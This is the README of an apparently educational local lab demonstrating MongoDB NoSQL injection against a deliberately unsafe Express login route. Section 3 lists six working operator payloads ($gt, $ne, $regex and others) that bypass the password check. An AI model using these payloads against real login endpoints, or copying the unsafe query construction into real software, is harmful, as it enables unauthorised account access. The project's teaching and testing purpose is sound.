# Topic 12 – Modern Database Attacks

> A controlled local MongoDB authentication laboratory. Use synthetic data only.

The repository now contains a runnable Node.js/Express application with:

- A secure comparison login route.
- A separate local-only lab route that intentionally demonstrates unsafe query construction.
- A browser login form with normal and structured-payload modes.
- MongoDB seed scripts and Docker Compose.
- Unit, security-boundary and real-MongoDB integration tests.

Never point this project at a real account, real credential or a database that the team does not own.

## 1. Quick start on the host

Prerequisites:

- Node.js 20 or newer.
- npm.
- Docker Desktop or another Docker Compose installation.
- A browser.

Clone and install:

~~~bash
git clone https://github.com/kiet1i38/modern-database-attacks.git
cd modern-database-attacks
npm ci
cp .env.example .env
~~~

Start only MongoDB:

~~~bash
docker compose up -d mongodb
npm run seed -- --lab
~~~

For a local lab run, open .env and change:

~~~dotenv
LAB_MODE=true
~~~

Then start the application:

~~~bash
npm start
~~~

Open http://127.0.0.1:3000.

The synthetic credentials are:

| Purpose | Username | Password |
| --- | --- | --- |
| Secure comparison | alice | synthetic-demo-password |
| Lab normal string | alice | lab-only-demo-password |
| Lab object payload | alice | Use the payload mode in the form |

The values above are synthetic and exist only for this local exercise.

## 2. Run everything with Docker

The default Compose file starts the app with the lab route disabled:

~~~bash
docker compose up --build -d
docker compose run --rm app node scripts/seed.js --lab
~~~

Open http://127.0.0.1:3000 and use secure comparison mode.

To enable the isolated lab route, use the lab override:

~~~bash
docker compose down
docker compose -f docker-compose.yml -f docker-compose.lab.yml up --build -d
docker compose -f docker-compose.yml -f docker-compose.lab.yml run --rm app node scripts/seed.js --lab
~~~

The override only changes LAB_MODE to true. The application is still bound to the host loopback interface and the route checks that requests are local.

Stop the services:

~~~bash
docker compose down
~~~

Remove the disposable local MongoDB volume only when you want a clean database:

~~~bash
docker compose down -v
~~~

## 3. API smoke checks

Health:

~~~bash
curl http://127.0.0.1:3000/api/health
~~~

Secure login with a string:

~~~bash
curl -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"synthetic-demo-password"}'
~~~

MongoDB operator payloads in the lab route:

~~~bash
# Greater than empty: bypasses equality without the correct password
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$gt":""}}'

# Greater than or equal to empty
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$gte":""}}'

# Not equal to a value that is not the stored password
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$ne":"not-the-password"}}'

# Regex matching any string
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$regex":".*"}}'

# Stored password is not in this list
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$nin":["not-the-password"]}}'

# The password field exists
curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$exists":true}}'
~~~

The word "like" in the assignment is illustrative, not a limit to `$gt` alone. This project uses a bounded catalog of six operator-shaped values. MongoDB operator syntax uses the `$` prefix, so `{ "gt": "" }` is not the same as `{ "$gt": "" }` and is intentionally rejected by the lab validator.

These payloads are intentionally available only in the local lab route. The route is not a secure authentication implementation.

## 4. Tests

Unit and security-boundary tests do not require MongoDB:

~~~bash
npm test
~~~

The integration test requires a running MongoDB. It uses the separate database named by MONGODB_TEST_DATABASE and synthetic data:

~~~bash
npm run test:integration
~~~

Run everything:

~~~bash
npm run test:all
~~~

The integration test verifies normal equality plus the six documented dollar-prefixed operator payloads against a real MongoDB server.

## 5. Application behavior

| Route | Mode | Behavior |
| --- | --- | --- |
| GET /api/health | All | Reports HTTP and MongoDB readiness. |
| POST /api/auth/login | Secure | Accepts scalar strings, finds by username and verifies a password hash. |
| POST /api/lab/login-observation | Local lab | Accepts a structured password value and observes the unsafe query shape. |
| GET /api/lab/status | All | Reports whether lab mode is enabled without exposing database details. |

The lab route is available only when LAB_MODE=true, NODE_ENV is not production and the request is from loopback.

## 6. Repository map

- PROJECT_STATUS.md: execution status, SOP, gates and next work item.
- docs/ARCHITECTURE.md: module boundaries and request flows.
- docs/DATABASE.md: collections, seed data and indexes.
- docs/API.md: request and response contracts.
- docs/SECURITY.md: trust boundary and lab safety.
- docs/TESTING.md: test commands and evidence.
- docs/DEVELOPMENT.md: local workflow.
- docs/DEMO_GUIDE.md: presentation and recovery steps.
- src/: application source and browser client.
- scripts/: seed and guarded reset commands.
- tests/: unit, security and MongoDB integration checks.

## 7. Safety boundary

- Keep the lab local and synthetic.
- Do not publish the MongoDB port beyond loopback.
- Do not commit .env, credentials, hashes from real accounts or session tokens.
- Do not reuse the lab route as an authentication implementation.
- Keep LAB_MODE=false unless the isolated observation is being performed.
